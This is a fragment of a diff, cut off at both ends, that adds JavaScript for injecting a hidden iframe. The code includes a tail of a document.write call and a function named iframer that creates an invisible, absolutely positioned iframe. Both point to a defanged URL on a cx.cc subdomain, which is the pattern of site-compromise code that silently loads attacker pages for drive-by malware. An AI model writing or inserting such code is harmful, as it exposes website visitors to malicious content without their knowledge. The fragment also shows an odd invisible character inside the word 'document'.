@@ -1,0 +1,9 @@
+rame src='hxxp://yhgdznfgz.cx.cc/showthread.php?t=82651514' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'></iframe>");
+}
+function iframer(){
+  var f = do​cument.createElement('iframe');
+  f.setAttribute('src', 'hxxp://yhgdznfgz.cx.cc/showthread.php?t=82651514');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.to
